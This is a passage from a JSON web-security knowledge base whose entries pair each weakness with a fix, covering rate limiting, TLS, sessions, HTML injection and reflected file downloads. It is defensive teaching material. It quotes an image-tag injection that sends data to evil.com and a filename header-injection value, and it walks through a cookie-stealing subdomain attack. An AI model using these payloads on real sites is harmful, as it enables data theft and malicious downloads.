"kbId": 116,
"title": "Aggregate access control protection",
"Description": "Verify the system can protect against aggregation or continuous access of secured functions, resources, or data. For example, possibly by the use of a resource governor to limit the number of edits per hour or to prevent the entire database from being scraped by an individual user. ",
"Solution": "The system should contain a counter which can keep up with the number of times a certain users addresses database tables and should be rejected when he passes a reasonable number. This violation should also be reported since it could indicate an attacker scraping your table contents and stealing company information. "
},
{
"kbId": 117,
"title": "Canonicalized user input",
"Description": "Whenever userinput is partially validated there is a high probability that the application misses a malicious input which could execute a successful attack on your application. ",
"Solution": "All userinput should be validated whenever the userinput string is complete and is being processed by your application. "
},
{
"kbId": 118,
"title": "Approved random number generator",
"Description": "The lack of entropy available for, or used by, a pseudorandom number generator can be a stability and security threat. ",
"Solution": "All random numbers, random file names, random GUIDs, and random must be generated using the cryptographic module''s approved random number generator when these random values are intended to be unguessable/unpredictable by an attacker. "
},
{
"kbId": 119,
"title": "Validated cryptographic modules",
"Description": "The National Institute of Standards and Technology (NIST) issued the FIPS 140 Publication Series to coordinate the requirements and standards for cryptography modules that include both hardware and software components. Protection of a cryptographic module within a security system is necessary to maintain the confidentiality and integrity of the information protected by the module. ",
"Solution": "Verify that cryptographic modules used by the application have been validated against FIPS 1402 or an equivalent standard. "
},
{
"kbId": 121,
"title": "Policy for managing cryptographic keys",
"Description": "When there is no policy for managing your cryptographic keys, expired or revoked keys that could unknowingly be used again thus becoming a threat for your encrypted data. ",
"Solution": "Verify that there is an explicit policy for how cryptographic keys are managed (e.g., generated, distributed, revoked, expired). Verify that this policy is properly enforced. "
},
{
"kbId": 122,
"title": "HTTPS and weakly or unencrypted links",
"Description": "Imagine the scenario where you have a login form and an application which supports HTTPS. Whenever the initial connection (login.php) is not HTTPS and after login (loggedin.php) will be HTTPS the username and password will not be sent through an encrypted manner thus could be easily compromised by attackers. This principle also applies to sending vulnerable data towards other unencrypted/weak encrypted links in your application. ",
"Solution": "Verify that credentials or other sensitive information is transported via TLS. "
},
{
"kbId": 123,
"title": "Error handling on trusted devices",
"Description": "Whenever error handling is not applied through trusted devices the errors it supplies can not be trusted since they can be tampered with. ",
"Solution": "Verify that all error handling is performed on trusted devices. "
},
{
"kbId": 124,
"title": "Single application level logging",
"Description": "Whenever the application contains a single applicationlevel logging implementation it becomes clear, transparent and easy to maintain. It also reduces the possibility that you overlook high priority logging. ",
"Solution": "Verify that there is a single applicationlevel logging implementation that is used by the software. "
},
{
"kbId": 125,
"title": "Aggregate user requests",
"Description": "Verify the system can protect against aggregation or continuous access to functions,   resources, or data. For example, possibly by the use of a resource governor to limit the number of edits per minute in order to to prevent an automatic attack ",
"Solution": "Verify the application has the ability to detect and alert on abnormal numbers of requests for information or processing highvalue transactions for that user role, automated use of web service extraction, or data loss prevention. For example, the average user should not be able to access more than 5 records per hour or 30 records per day or add 10 friends to a social network per minute. "
},
{
"kbId": 126,
"title": "Principle of least privilege",
"Description": "The principle of least privilege recommends that accounts have the least amount of privilege required to perform their business processes. This encompasses user rights, resource permissions such as CPU limits, memory, network, and file system permissions. ",
"Solution": "The principle means giving a user account only those privileges which are essential to that user\u2019s work. For example, a backup user does not need to install software: hence, the backup user has rights only to run backup and backuprelated applications. Any other privileges, such as installing new software, are blocked.The principle applies also to a personal computer user who usually does work in a normal user account, and opens a privileged, password protected account (that is, a superuser) only when the situation absolutely demands it.This principle can also be applied to your webapplications. Instead of solely depending on role based authentication methods using sessions, we rather want to assign privileges to users by means of a DatabaseBased Authentication system.We still use sessions in order to identify if the user was logged in correctly, only now instead of assigning that user with a specific role we assign him with privileges to verify which actions he is privileged to perform on the system.Also, a big pro of this method is, whenever a user has to be assigned fewer privileges your changes will be applied on the fly since the assigning does not depend on the session which otherwise had to expire first. "
},
{
"kbId": 127,
"title": "TLS implementation must operate in an approved mode of operation",
"Description": "To enforce the maximum amount of security out of the TLS implementation it should always suffice the approved mode of operation. ",
"Solution": "See See http://csrc.nist.gov/groups/STM/cmvp/documents/fips1402/FIPS1402IG.pdf for more extended details on how to reach this goal. "
},
{
"kbId": 128,
"title": "Character encoding",
"Description": "Character encoding is the process of mapping characters, numbers and other symbols to a standard format. Typically, this is done to create a message ready for transmission between sender and receiver. It is, in simple terms, the conversion of characters (belonging to different languages like English, Chinese, Greek or any other known language) into bytes. An example of a widely used character encoding scheme is the American Standard Code for Information Interchange (ASCII) that initially used 7bit codes. More recent examples of encoding schemes would be the Unicode UTF8 and UTF16 computing industry standards. In the space of application security and due to the plethora of encoding schemes available, character encoding has a popular misuse. It is being used for encoding malicious injection strings in a way that obfuscates them. This can lead to the bypass of input validation filters, or take advantage of particular ways in which browsers render encoded text. ",
"Solution": "When trying to figure out the character encoding of a resource, user agents will try, in this order: The HTTP ContentType header sent by the server  The XML declaration (only for XHTML documents)  HTML/XHTML meta element.Make sure this information is provided by your application for the server in order to prevent it from guessing the wrong encoding standard, leaving room for injection. Note:These three ways of providing the character encoding of a document are not equivalent. "
},
{
"kbId": 129,
"title": "HTTP request methods",
"Description": "HTTP offers a number of methods that can be used to perform actions on the web server. Many of these methods are designed to aid developers in deploying and testing HTTP applications. These HTTP methods can be used for nefarious purposes if the web server is misconfigured. It recommended to read about the different available methods, their purposes and limitations.Available method are:GET The GET method requests a representation of the specified resource. Requests using GET should only retrieve data and should have no other effect. (This is also true of some other HTTP methods.)[1] The W3C has published guidance principles on this distinction, saying, \"Web application design should be informed by the above principles, but also by the relevant limitations.HEAD The HEAD method asks for a response identical to that of a GET request, but without the response body. This is useful for retrieving metainformation written in response headers, without having to transport the entire content.POST The POST method requests that the server accept the entity enclosed in the request as a new subordinate of the web resource identified by the URI. The data POSTed might be, for example, an annotation for existing resources; a message for a bulletin board, newsgroup, mailing list, or comment thread; a block of data that is the result of submitting a web form to a datahandling process; or an item to add to a database. PUT The PUT method requests that the enclosed entity be stored under the supplied URI. If the URI refers to an already existing resource, it is modified; if the URI does not point to an existing resource, then the server can create the resource with that URI. DELETE The DELETE method deletes the specified resource. TRACE The TRACE method echoes the received request so that a client can see what (if any) changes or additions have been made by intermediate servers.OPTIONS The OPTIONS method returns the HTTP methods that the server supports for the specified URL. This can be used to check the functionality of a web server by requesting ''*'' instead of a specific resource.CONNECT The CONNECT method converts the request connection to a transparent TCP/IP tunnel, usually to facilitate SSLencrypted communication (HTTPS) through an unencrypted HTTP proxy.PATCH The PATCH method applies partial modifications to a resource.Some of the methods (for example, GET, HEAD, OPTIONS and TRACE) are, by convention, defined as safe, which means they are intended only for information retrieval and should not change the state of the server. In other words, they should not have side effects, beyond relatively harmless effects such as logging, web caching, the serving of banner advertisements or incrementing a web counter. Making arbitrary GET requests without regard to the context of the application''s state should therefore be considered safe. However, this is not mandated by the standard, and it is explicitly acknowledged that it cannot be guaranteed.Despite the prescribed safety of GET requests, in practice their handling by the server is not technically limited in any way. Therefore, careless or deliberate programming can cause nontrivial changes on the server. This is discouraged, because it can cause problems for web caching, search engines and other automated agents, which can make unintended changes on the server. For example, a website might allow deletion of a resource through a URL such as http://example.com/article/1234/delete, which, if arbitrarily fetched, even using GET, would simply delete the article.By contrast, methods such as POST, PUT, DELETE and PATCH are intended for actions that may cause side effects either on the server, or external side effects such as financial transactions or transmission of email. Such methods are therefore not usually used by conforming web robots or web crawlers; some that do not conform tend to make requests without regard to context or consequences.Methods PUT and DELETE are defined to be idempotent, meaning that multiple identical requests should have the same effect as a single request (note that idempotence refers to the state of the system after the request has completed, so while the action the server takes (e.g. deleting a record) or the response code it returns may be different on subsequent requests, the system state will be the same every time). Methods GET, HEAD, OPTIONS and TRACE, being prescribed as safe, should also be idempotent, as HTTP is a stateless protocol.In contrast, the POST method is not necessarily idempotent, and therefore sending an identical POST request multiple times may further affect state or cause further side effects (such as financial transactions). In some cases this may be desirable, but in other cases this could be due to an accident, such as when a user does not realize that their action will result in sending another request, or they did not receive adequate feedback that their first request was successful. While web browsers may show alert dialog boxes to warn users in some cases where reloading a page may resubmit a POST request, it is generally up to the web application to handle cases where a POST request should not be submitted more than once.Note that whether a method is idempotent is not enforced by the protocol or web server. It is perfectly possible to write a web application in which (for example) a database insert or other nonidempotent action is triggered by a GET or other request. Ignoring this recommendation, however, may result in undesirable consequences, if a user agent assumes that repeating the same request is safe when it is not.The TRACE method can be used as part of a class of attacks known as crosssite tracing; for that reason, common security advice is for it to be disabled in the server configuration. Microsoft IIS supports a proprietary \"TRACK\" method, which behaves similarly, and which is likewise recommended to be disabled ",
"Solution": "Verify that the application accepts only a defined set of HTTP request methods, such as GET and POST and unused methods are explicitly blocked/disabled. "
},
{
"kbId": 130,
"title": "Verbose version information",
"Description": "Revealing system data or debugging information helps an adversary learn about the system and form a plan of attack. An information leak occurs when system data or debugging information leaves the program through an output stream or logging function. ",
"Solution": "Verify that the HTTP headers do not expose detailed version information of system components. For each different type of server, there are hardening guides dedicated especially for this type of data leaking. The same applies for i.e any other leak of version information such as the version of your programming language or other services running to make your application function. "
},
{
"kbId": 131,
"title": "HTTP headers added by a frontend",
"Description": "There are some kind of headers that uses tokens such as Bearer or JWT which are signed or calculated using a key, by the server that creates it. ",
"Solution": "Verify the integrity and authenticity of the HTTP headers added by a trusted proxy or SSO devices by checking the digital signature or by recalculating the hash or integrity method using a private key or passphrase. "
},
{
"kbId": 132,
"title": "Session management control",
"Description": "The ability to restrict and maintain user actions within unique sessions is critical to web security. Most users of this guide will be using an application framework with built in session management capabilities. Others will use languages such as Perl CGI that do not. Those without a built in session management system and those who override the existing session management systems are at an immediate disadvantage. Implementations built from scratch are often weak and breakable. Developers are strongly discouraged from implementing their own Session Management. ",
"Solution": "Always use the frameworks default session management control implementation in your application.  If not possible you should find hardened guides in how to accomplish this in a secure manner. "
},
{
"kbId": 133,
"title": "Available log analysis tools",
"Description": "With a log analysis tool in place, you can easily and quickly do forensics as soon as you notice your application is under attack by attackers and block them out. ",
"Solution": "A list of recommended tools by OWASP you can find at https://www.owasp.org/index.php/Log_review_and_managementLogging_Tools "
},
{
"kbId": 134,
"title": "Distinguish log",
"Description": "Whenever log fields are distinguished from each other by means of logs from trusted and untrusted log fields in your log entries your logs become clearer and more transparent. ",
"Solution": "Verify that log fields from trusted and untrusted sources are distinguishable in log entries. If possible it is highly recommended that you separate these files entirely from each other so the logs with untrusted userinput cannot corrupt the system generated logs."
},
{
"kbId": 135,
"title": "Sanitise sensitive data rapidly from memory",
"Description": "Whenever sensitive data is rapidly removed from the systems\u2019 memory, this decreases the possibility the attacker has to compromise this data by means of memory dumping attacks. ",
"Solution": "Verify that sensitive data is rapidly sanitized from memory as soon as it is no longer needed and handled in accordance with functions and techniques supported by the framework/library/operating system. "
},
{
"kbId": 136,
"title": "Logging is performed before executing the transaction",
"Description": "Whenever the logging is performed before executing a transaction you can be ensured that the transactions are logged. This increases the integrity of your log files. If logging is performed after executing a transaction and an attacker does a succcessful attack, then the logging part may not be reached and no trace would be recorded for the attack. ",
"Solution": "Verify that logging is performed before executing the transaction. If logging was unsuccessful (e.g. disk full, insufficient permissions) the application fails safe. This is for when integrity and nonrepudiation is a must. "
},
{
"kbId": 137,
"title": "Verify integrity using checksums",
"Description": "Always use checksums when working with interpreted code, libraries, executables, and configuration files, when these checksums do not match you can determine that these files are corrupted or backdoored. ",
"Solution": "Verify that the integrity of interpreted code, libraries, executables, and configuration files is verified using checksums or hashes (not MD5). "
},
{
"kbId": 138,
"title": "Deny access from remote resources or systems",
"Description": "You should always fend off remote connections with untrusted systems/resources which try to connect to your application in order to prevent connecting to malicious systems that try to attack your application. ",
"Solution": "Since this is very difficult to achieve on application level we recommend implementing EGRESS firewall rules. "
},
{
"kbId": 139,
"title": "Certificate paths revocation information",
"Description": "Whenever your certificate authority is not trusted anymore you should always be able to recall these certificates ASAP to prevent man in the middle attacks on your applications users. ",
"Solution": "The trust anchor for given zone is found in the keyset<zone name> file on the secure signing computer in the same location where the signed and unsigned copies of the zone reside. This file is created automatically as part of the signing process. A certificate revocation list (CRL) is a list, created and signed by a certificate authority (CA), which contains serial numbers of certificates that have been issued by that CA and are currently revoked. In addition to the serial number of the revoked certifications, the CRL also contains the reason for revocation for each certificate and the time the certificate was revoked. The serial number for each revoked certificate is kept in the CAs database and published in the CRL until the certificate expires.After the revoked certificate is expired, the certificates entry in the CRL is removed and the CA may remove the certificate from its database. Typically, the revoked certificate will remain in the CRL for one publication period after the certificate expires. By all times you should have this information in reach in order to take quick actions. "
},
{
"kbId": 140,
"title": "HTML Caching and client side caching",
"Description": "Developers creating HTML5 applications can create fully offlineaware applications using the HTML5 ApplicationCache interface. The Application Cache uses a cache manifest file to specify which files in an HTML5 application can be used offline, and which files require a network connection. ",
"Solution": "Never store sensitive information in a client side cache since this can be easily compromised by attackers. The same principle does also apply to autocomplete functions.Recommended knowledge base item: Caching headers  Client side storage "
},
{
"kbId": 141,
"title": "Cryptographic modules should operate in their approved mode according to their published security policies",
"Description": "Whenever cryptographic modules do not operate in their approved mode according to their published security policies these methods could become weak and become inadequate to ensure strong ciphers. ",
"Solution": "Always verify that cryptographic modules operate in their approved mode according to their published security policies before implementing them into your application. "
},
{
"kbId": 142,
"title": "Sending data parameters to untrusted devices",
"Description": "Whenever an application sends data/parameters to untrusted devices this data could be compromised if the device has malicious intents. ",
"Solution": "Verify the application minimizes the number of parameters sent to untrusted systems, such as hidden fields, Ajax variables, cookies and header values.These untrusted devices should also be documented if possible and should be taken into account when developing your application to minimize the possibility you send unintended sensitive data towards these devices.Recommended knowledge base items: Highlevel architecture should be defined  Identify all application components "
},
{
"kbId": 143,
"title": "Proces high value business logic flows in a trusted environment",
"Description": "Whenever highvalue business logic flows are processed in a trusted monitored environment it reduces the movability of an attacker and chances of succeeding to perform successful attacks. If an attacker should breach your application his actions could be rapidly followed and countermeasures could be taken. ",
"Solution": "Verify the application processes or verifies all highvalue business logic flows in a trusted environment, such as on a protected and monitored server. "
},
{
"kbId": 144,
"title": "Data from untrusted sources",
"Description": "Whenever data from untrusted servers is executed by your application there is a high probability this data could be contaminated with malicious code. Such as for example XSS from JSON files, or XXE when parsing XML files. ",
"Solution": "Verify the application code does not execute uploaded data obtained from untrusted sources. You could consider sandboxing this data when showing the content on your application.NOTE: Sandboxing however does not stop an XXE attack. So it is highly recommended to also encode or escape all data entering your application from third party sources. "
},
{
"kbId": 145,
"title": "User restriction for sensitive data",
"Description": "Always enforce multiple layers of security whenever you want to protect sensitive data/files on your application. If one layer should fail the other layers should prevent the attackers from succeeding. ",
"Solution": "Whenever sensitive data is stored on the server store the data in a separate folder with permission rules in order to prevent unauthorized users from reading the files. As an indepth solution, you could also check if the session of the user has sufficient privileges to read the files according to the level of authorization. Recommended knowledge base item: \u2022\tMissing authentication or authorization \u2022\tSanitize sensitive data rapidly from memory"
},
{
"kbId": 146,
"title": "Runtime environment",
"Description": "Whenever you use runtime environments you want to make sure these are not susceptible for buffer overflows since this could lead to compromise of your application. ",
"Solution": "There are a number of runtime solutions that can detect stack corruption and buffer overruns or guard against attacks. These solutions typically terminate the program when an anomaly is detected, preventing the execution of arbitrary code. "
},
{
"kbId": 147,
"title": "Automatic parameter binding",
"Description": "If the application framework allows automatic mass parameter assignment (also called automatic variable binding) from the inbound request to a model, verify that security sensitive fields such as ''accountBalance'', ''role'' or ''password'' are protected from malicious automatic binding. Whenever your application takes parameters in HTTPs GET statement and passes them as variables to code within the application this could become a safety hazard since the application processes these variables in his operations. ",
"Solution": "When working with automatic variable binding you should create whitelists of what parameters are expected and allow only these parameters to be passed into your application operation. "
},
{
"kbId": 148,
"title": "Cryptographic function implementation",
"Description": "Whenever a cryptographic function is not implemented on the server side then these cryptographic functions could easily be bypassed by an attacker. ",
"Solution": "Verify that all cryptographic functions used to protect secrets from the application user are implemented server side. "
},
{
"kbId": 149,
"title": "Cryptographic modules must fail securely",
"Description": "Whenever a cryptographic module does not fail securely this the device needs to be put in error state so it''s not useable anymore. ",
"Solution": "We recommend using the National Institute of Standards and Technology (NIST) standard on testing the cryptographic module making it perform the selftests to see if it fails securely. "
},
{
"kbId": 150,
"title": "Access to any master secret must be protected from unauthorized access",
"Description": "Access to any master secret must be protected from unauthorized access in order to protect the integrity and the confidentiality of the data. ",
"Solution": "Whenever sensitive data is stored on the server you should consider storing this data in a separate folder with permission rules in order to prevent unauthorized users from reading these files. It is also highly recommended to encrypt/hash the password in order to enforce higher security. "
},
{
"kbId": 151,
"title": "Enforce policys for sensitive data processing",
"Description": "When you process data you should always enforce policies for the transfer of sensitive data in order to enforce a higher level of security imposing structured thresholds to fend off attackers. ",
"Solution": "First, you have to create a list which contains locations of where all sensitive data is used and processed. Next, you create a policy that tells who is allowed and to what extent they have privileges to look into which data. When this data moves through the network it should always be encrypted (TLS) and also be stored encrypted. Thereafter you should establish monitoring and testing methods to verify that everything stays encrypted and your policies are properly enforced. Also, determine whenever data storage is necessary or becomes a redundancy. Whenever sensitive data does not have to be stored don''t store it. This reduces the quantity of data may your application ever be compromised. Ultimately, verify accessing sensitive data is logged, if the data is collected under relevant data protection directives or where logging of accesses is required. Sensitive data or primary keys, such as personally identifiable information or credit cards should also be anonymized, masked or truncated on the server before transmission to the client."
},
{
"kbId": 152,
"title": "Access control pattern",
"Description": "For successful access control/login functionality there are a lot of things to take into consideration before you start developing this type of functionality. ",
"Solution": "It is highly recommended to study all the listed items and implement these principles in your access control/login system in order to enforce a higher level of security.1. Audit logs 2. Principle of least privilege (Privilege based authentication system) 3. Passwords must be encrypted, salted and stretched 4. CrossSite Request Forgery (CSRF for authenticated forms) 5. Session pattern 6. Session fixation 7. Session hijacking 8. Forget password functions 9. Client side authentication 10. Client side state management 11. Cross subdomain cookie attack "
},
{
"kbId": 153,
"title": "Password forget pattern",
"Description": "Whenever you are implementing a forgot password function into your system there are a few things you need to take into consideration in order to prevent security flaws in your application.1. Forget password functions 2. Denial of service by locking out accounts 3. Username enumeration 4. Does The application enforce the use of secure passwords 5. Disallow the use of old passwords ",
"Solution": "The first thing is verify the password has been forgotten and other recovery paths send a link including a timelimited activation token rather than the password itself. Additional authentication based on softtokens (e.g. SMS token, native mobile applications, etc.) can be required as well before the link is sent over. Second, you should not lock out the user\u2019s account whilst the process of getting a new password is in progress. This could lead to a Denial of service attack whenever an attacker decides to intentionally lock out the users with an automated attack. Third, whenever the new password request was set in progress, the message you display should be generalized in order to prevent username enumeration. Fourth, always disallow the use of old passwords and implement a strong password policy."
},
{
"kbId": 154,
"title": "Sessions pattern",
"Description": "When working with sessions there are a couple of things you need to consider in order to implement them securely throughout your system. For more detailed information about these items you should check the knowledgebase about: 1.\tSession management control 2.\tSession cookies without the Secure flag 3.\tSession cookies without the HTTP Only flag 4.\tExternal session hijacking 5.\tInsecure transmission of session cookies 6.\tSession information is not stored server side 7.\tSession ids should be generated with sufficient entropy, the preferred method is the frameworks default session management control implementation is used by the application 8.\tUser generated session ids should be rejected by the server 9.\tThe logout functionality should revoke the complete session 10.\tThe login functionality should always generate (and use) a new session id 11.\tSession IDs do not timeout.(idle) 12.\tAbsolute session timed out 13.\tVerify that the session id is never disclosed 14.\tSession cookies (Domain) ",
"Solution": "The items as pointed out before should be looked into and taken into consideration whenever you are working with sessions on your system in order to enforce a high level of security.Though there are more than ten design patterns related to session, all of them need to be implemented.  If any one is left out for implementation, the whole session management layer is not secure and could be defeated by attackers. "
},
{
"kbId": 155,
"title": "Submit forms pattern",
"Description": "Whenever a user can submit a form in your system you should consider implementing the following defense mechanism in order to ensure highlevel security.1.  Single user input validation controls and Audit logs 2.  CSRF tokens 3.  Principle of least privilege 4.  GET/POST requests ",
"Solution": "Here are the steps described briefly. For more detailed information you should look into these items in the knowledge base.First, you should create a single user input validation control class which should validate the expected input values in order to verify if the user is not tampering data or is injecting malicious code into your application. All infringements should be logged and repercussions should be taken whenever these infringements are frequent.Second, whenever an authenticated user is submitting the form always ensure the forms contain CSRF tokens in order to prevent crosssite request forgery. Third, Whenever there are authenticated users with different roles/privileges you should enforce restrictions on the server side upon your form submits/processing in order to prevent privilege escalation. You should apply the principle of least privilege in order to ensure a higher level of security. Fourth, Whenever the application is sending sensitive data through the form submit this data must always be sent through a POST variable instead of a GET since a GET will leak this data through the URL by example the referrer header."
},
{
"kbId": 156,
"title": "SQL injection Column truncation",
"Description": "Whenever an applications structural logic mismatches with the database structural logic an attacker gains the opportunity to truncate his submit towards your database column by submitting a value longer than the limit allowed in the database. Imagine you have a system where users can register themselves.The attacker can abuse this behavior of the database to overflow the length limit and truncate his submit and register himself as the admin, thus gaining its privileges.  ",
"Solution": "On critical places where unique values are enforced and expected, such as usernames in order to authorize or distribute certain privileges. The users submit should be checked on the server side in order to verify if it does not exceed the limit set in your database. "
},
{
"kbId": 157,
"title": "User registration pattern",
"Description": "Whenever you allow users to register on your system there are a couple of things you need to take into consideration in order to enforce a high level of security For more detailed information about these items you should check the knowledgebase about:1.\tColumn Truncation SQL injection(for MySQL databases) 2.\tSingle input validation controls 3.\tAudit logs 4.\tPrevent password leaking 5.\tPredictable password and or token generation 6.\tAre all passwords hashed, salted and stretched 7.\tDoes the application enforce the use of secure passwords?  ",
"Solution": "The items as pointed out before should be looked into and taken into consideration whenever you are letting users register on your system in order to enforce a high level of security.Here are the steps described briefly. For more detailed information you should look into these items in the knowledge base.First, You enforce limits on the length of the users submits on the server side in order to prevent him from truncating his submits. These limits have to correlate with the limits you set in your column in the database.Second, you should create a single user input validation control class which should validate the expected input values in order to verify if the user is not tampering data or injecting malicious code into your application. All infringements should be logged and repercussions should be taken whenever these infringements are frequent.Third, never display the user\u2019s password on a screen anywhere.Fourth, Whenever you generate a password for your users, this password should always be randomized sufficiently.Fifth, encrypt your passwords by proven cryptographic standards when storing them.Sixth, Enforce secure passwords by implementing good password policies. "
},
{
"kbId": 158,
"title": "Cross subdomain cookie attack",
"Description": "A quick overview of how it works:1. A website www.example.com hands out subdomains to untrusted third parties 2. One such party, Mallory, who now controls evil.example.com, lures Alice to her site 3. A visit to evil.example.com sets a session cookie with the domain .example.com on Alice''s browser 4. When Alice visits www.example.com, this cookie will be sent with the request, as the specs for cookies states, and Alice will have the session specified by Mallory''s cookie. 5. Mallory can now use Alice her account. ",
"Solution": "In this scenario changing the sessionID on login does not make any difference since Alice is already logged in when she visits Mallory''s evil web page.It is good practice to use a completely different domain for all trusted activity.For example Google uses google.com for trusted activities and *.googleusercontent.com for untrusted sites.Also when setting your cookies to specify which domains they are allowed to be send to. Especially on your trusted domain you do not want to leak cookies to unintended subdomains. highly recommended is to not use wildcards when setting this option. "
},
{
"kbId": 159,
"title": "HTML injections",
"Description": "Whenever an attacker can inject HTML in your application there is a variety of different attacks he could perform such as:1. Content Spoofing 2. Image Tag Injection \t 3. Form Rerouting 4. Base Jumping 5. Element Override 6. Hanging TextareaEven when your application intercepts XSS injections by means of a content security policy header it still remains vulnerable to the attacks summarized above. ",
"Solution": "1.Content spoofing Otherwise known as \"Content Injection\" or \"Virtual Defacement\" occurs whenever an attacker can inject code into your application. It is very important to sanitize and or encode user data before you display it on screen as HTML.2.Image tag injection occurs whenever an attacker injects a broken image tag with a nonterminated parameter like: \"img src=''http://evil.com?steal.php?value= Every content after value= parameter will now be stolen and send to evil.com by the attacker till the injection finds the next occurrence of a matching single quote. Again you should sanitize and encode the user input to prevent an image tag from being injected in your application. For whenever a user is permitted to submit an image on your application enforce and verify the application accepts valid nonbroken tags only.3.The \"form\" tag can''t be nested. The toplevel occurrence of this element always takes precedence over subsequent appearances. Again you must avoid this type by properly encoding and sanitizing your userinputs.4.Whenever an attacker injects a \"base\" tag into your application it can steal data because the tag specifies the base URL/target to where to process the data to. The solution to base jumping would be to use absolute paths in your application such as  action=''/update_profile.php'' instead of: action=''update_profile.php''5/6 can both also easily be prevented simply be encoding or sanitizing your userinput submitted towards your application. Always validate your user input on a high level(serverside constraint). Whenever your application expects an integer you should validate and check whether the user submitted input really is what you expected it to be and otherwise, you terminate and log the request."
},
{
"kbId": 160,
"title": "RFD and file download injections",
"Description": "Reflective file download occurs whenever an attacker can \"forge\" a download through misconfiguration in your \"disposition\" and \"content type\" headers. Instead of having the attacker to upload an evil file to the web server he can now force the browser to download a malicious file by abusing these headers and setting the file extension to any type he wants.Now, whenever there is also userinput being reflected back into that download it can be used to forge evil attacks. The attacker can present an evil file to ignorant victim''s who are trusting the domain of which the download was presented from.File download injection is a similar type of attack except this attack is made possible whenever there is userinput that is reflected into the \"filename=\" parameter in the \"disposition\" header. The attacker again can force the browser to download a file with his own choice of extension and set the content of this file by injecting this directly into the response like filename=evil.bat%0A%0D%0A%0DinsertEvilStringHereWhenever the user now opens the downloaded file the attacker can gain full control over the target\u2019s device.  ",
"Solution": "First, never use user input directly into your headers since an attacker can now take control over it.Secondly, you should check if a filename really does exist before presenting it towards the users. You could also create a whitelist of all files which are allowed to be downloaded and terminate requests whenever they do not match.Also, you should disable the use of \"path parameters\". It increases the attacker\u2019s attack vector and these parameters also cause a lot of other vulnerabilities. And last you should sanitize and encode all your userinput as much as possible. Reflective file downloads depend on userinput being reflected in the response header. Whenever this input has been sanitized and encoded it should not do any harm to any system it is being executed on"
},
{
"kbId": 161,
"title": "Identify all application components",
"Description": "When you are building an application you first want to map where you are placing source files, libraries and executables.With these components identified and mapped, it becomes transparent where possible pitfalls might be in your application and increases the maintainability of the system. Also, you have an indicator where possible reinforcements have to be implemented to avoid attacks.(i.e places where your application contains executable''s) ",
"Solution": "Verify that all application components (either individual or groups of source files, libraries, and/or executables) that are present in the application are identified.When you identified these components you may want to map and document them in order to have a quick reference to this infrastructure when needed. "
},
{
"kbId": 162,
"title": "Identify external dependencies",
"Description": "Sometimes your application has certain external dependencies which may strongly influence your application''s operation. These external dependencies might become an attackers target since compromising that service might lead to a DoS of your system or influence the system in such a way it leaves room for other attacks. ",
"Solution": "First, you must identify which external dependencies your application relays on for its operation. Second, there should be a failsafe implemented should this dependency ever fail to deliver its services towards your application. "
},
{
"kbId": 163,
"title": "High level architecture should be defined",
"Description": "Whenever you are developing an application you want to map all the architecture it contains. Whenever there are breaches, updates, or other escalations it makes it easy and transparent for forensics, operators, and developers to do their job as fast as possible. ",
"Solution": " Verify that a highlevel architecture for the application has been defined. This means some sort of a technical resign has to be composed of this architecture and all the elements it provides. This gives a visual representation of your application and makes it easier to work through.While you are mapping your application architecture you should also add all other components your application contains in terms of business functions and/or security functions they provide.When you map these components it becomes more transparent about different types of security mitigations that might be forgotten for some of your business functions. Because again, you now own a visual representation of this logic. Your application also becomes more manageable in terms of keeping up with the latest security updates and patches and gives you a better view of obsolete configurations, functions, and components which can be removed from the system.This ofcourse also goed for all external components that your application depends on!"
},
{
"kbId": 164,
"title": "Threat modeling",
"Description": "Threat modeling is a procedure for optimizing Network/ Application/ Internet Security by identifying objectives and vulnerabilities, and then defining countermeasures to prevent, or mitigate the effects of, threats to the system. A threat is a potential or actual undesirable event that may be malicious (such as DoS attack) or incidental (failure of a Storage Device). Threat modeling is a planned activity for identifying and assessing application threats and vulnerabilities. ",
"Solution": "Threat modeling is best applied continuously throughout a software development project. The process is essentially the same at different levels of abstraction, although the information gets more and more granular throughout the lifecycle. Ideally, a highlevel threat model should be defined in the concept or planning phase, and then refined throughout the lifecycle. As more details are added to the system, new attack vectors are created and exposed. The ongoing threat modeling process should examine, diagnose, and address these threats.Note that it is a natural part of refining a system for new threats to be exposed. For example, when you select a particular technology  such as Java for example  you take on the responsibility to identify the new threats that are created by that choice. Even implementation choices such as using regular expressions for validation introduce potential new threats to deal with.More indepth information about threat modeling can be found at: https://www.owasp.org/index.php/Application_Threat_Modeling "
},
{
"kbId": 165,
"title": "Differential analysis attack",
"Description": "Whenever an attacker sends a request to the server, an example by means of authentication functionality. He can measure the average response time between a request containing a valid username and a request containing a invalid username. The attacker can now use this differential in response time to enumerate user accounts. ",
"Solution": "Verify that all authentication challenges, whether successful or failed, should respond in the same average response time. This same methodology applies for other sensitive information that could potentially be recovered with differential attacks. "
},
{
"kbId": 166,
"title": "Client side input validation",
"Description": "As web applications become more advanced, an increasing amount of HTML is generated by JavaScript on the clientside rather than by the server. Anytime content needs to be changed without refreshing the entire page, the update must be performed using JavaScript. Most notably, this is the case when a page is updated after an AJAX request.XSS vulnerabilities can be present not only in your website''s serverside code, but also in your website''s clientside JavaScript code. Consequently, even with completely secure serverside code, the clientside code might still unsafely include user input in a DOM update after the page has loaded. If this happens, the clientside code has enabled an XSS attack through no fault of the serverside code. ",
"Solution": "First, there must be a client side input validation method as you would apply to the server side. This means you should also apply input rejection as well as typecasting and such. This is to prevent users from being attacked by XSS attacks which are undetectable by the server.Recommended knowledge base items: Positive validation method  Single input validation controls  Input rejection  Input validation "
},
{
"kbId": 167,
"title": "Positive validation model",
"Description": "There are two popular methods for handling input validation. The first is blacklisting and the second one is the whitelisting method, also known as a positive validation model. The big disadvantage of the blacklisting model would be that an attacker has a great diversity into forging his attack strings and payloads which can make it hard for your application to detect all of them. It would be very time consuming importing them all into your system. Whenever you are using a positive validation model you are simply checking for the input you were expecting as defined in your application\u2019s operation, for example:Let''s say you have a form and were expecting it to return the value of a checkbox. This would be a fixed value, yes or no? Whenever the value diverges from the expected input in the applications operation you can assume there was an intercepting proxy tampering these values and act accordingly to it.  Same goes for whenever you were expecting just a string, integer, alphanumeric character or even special strings such as names as O\u2019Reily. This method also makes your code clear, transparent and highly maintainable. ",
"Solution": "First there must be a client side input validation method as you would apply to the server side. This means you should also apply input rejection as well as typecasting and such. This is to prevent users from being attacked by XSS attacks which are undetectable by the server."
},
{
"kbId": 168,
"title": "TLS certificate public key pinning",
